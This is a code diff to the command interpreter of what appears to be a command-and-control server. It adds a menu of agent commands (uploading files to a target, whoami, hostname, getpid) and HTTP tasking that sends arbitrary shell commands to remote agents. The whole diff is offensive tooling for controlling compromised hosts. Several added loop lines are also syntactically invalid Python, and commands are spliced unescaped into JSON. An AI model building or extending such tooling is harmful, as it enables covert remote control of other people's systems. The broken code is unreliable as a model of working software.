@@ -8,6 +8,7 @@ import queue
 import time
 import base64
 import pymongo
+import json
 
 class Interpreter(threading.Thread):
     def __init__(self, agentList, listeners, loggers):
@@ -429,6 +430,18 @@ class Interpreter(threading.Thread):
                     self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Restarting beacon')
                     self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Cleaning Batch list')
                     break
+                elif (single_cmd.casefold().strip(" ") == ""):
+                    print('''
+[* Interpreter-Msg] No command entered. Enter (exit, quit, or q) to exit or one of the following commands:
+                    - upload <localfile> <remotefile>   :   Uploads base64 encoded <LocalFile> to the <RemoteFile> path location on the target through the agent
+                    - pwd                               :   Prints the current working directory the agent is executing from
+                    - ping                              :   PONG.
+                    - getpid                            :   Returns the Agent's process ID
+                    - whoami                            :   Returns the user that the agent is running as
+                    - hostname                          :   Returns the hostname of the system that the agent is executing on
+                    - quit/exit                         :   Exits Single-mode interaction and returns to the main menu (Does not kill the agent connection)
+                    - clear                             :   Clears the screen
+            ''')
                 elif (single_cmd.casefold().strip(" ") == "shell"):
                     print("[* Interpreter-Msg] Can't spawn shells in this environment")
                     print("[* Interpreter-Msg] Please exit if that is the desired result\n")
@@ -437,6 +450,10 @@ class Interpreter(threading.Thread):
                 elif (single_cmd.casefold().strip(" ") == "clear"):
                     os.system("clear")
                     self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Screen cleared')
+                elif (conn.getTT() == "HTTP" and single_cmd.casefold().strip(" ") == "ping"):
+                    ret_val = json.loads(conn.execute(f'[{{"task_type":"ping","agent_id":"{str(conn.getID())}"}}]'))
+                    res_task_id = [key for key in ret_val.keys() if key != "agent_id" and key != "_id" and key != "result_id"]
+                    for id in res_task_id print(ret_val[res_task_id[0]]['contents'])
                 elif (single_cmd.startswith("upload")):
                     try:
                         local_filename = str(single_cmd.split()[1])
@@ -458,7 +475,12 @@ class Interpreter(threading.Thread):
                         print(f"[+] Sending Command: {single_cmd} to agent {str(single_agent.getID())}")
                         time.sleep(0.1)
                         print(f"[* SINGLE-CMD] Agent {str(single_agent.getID())} response: ")
-                        print(conn.execute(single_cmd))
+                        if conn.getTT() == "TCP" or conn.getTT() == "DNS":
+                            print(conn.execute(single_cmd))
+                        elif conn.getTT() == "HTTP":
+                            ret_val = json.loads(conn.execute(f'[{{"task_type":"execute","agent_id":"{str(conn.getID())}","command":"{single_cmd}"}}]'))
+                            res_task_id = [key for key in ret_val.keys() if key != "agent_id" and key != "_id" and key != "result_id"]
+                            for id in res_task_id print(ret_val[res_task_id[0]]['contents'])
                     except Exception as ex:
                         print("[* Interpreter-Msg] Error with sending command or receiving output")
                         self.loggers[0].q_log('serv','warning','[* Interpreter-Msg] Error with sending command or receiving output')
@@ -474,8 +496,6 @@ class Interpreter(threading.Thread):
 
         for agent in self.agentList:                                         
             time.sleep(0.1)
-            if agent.execute("exit") == agent.getReply("exit"):
-                self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Exit] Successfully exited connection for agent '+str(agent.getID()))
 
             if agent.getTT() == "TCP":
                 if agent.execute("exit") == agent.getReply("exit"):
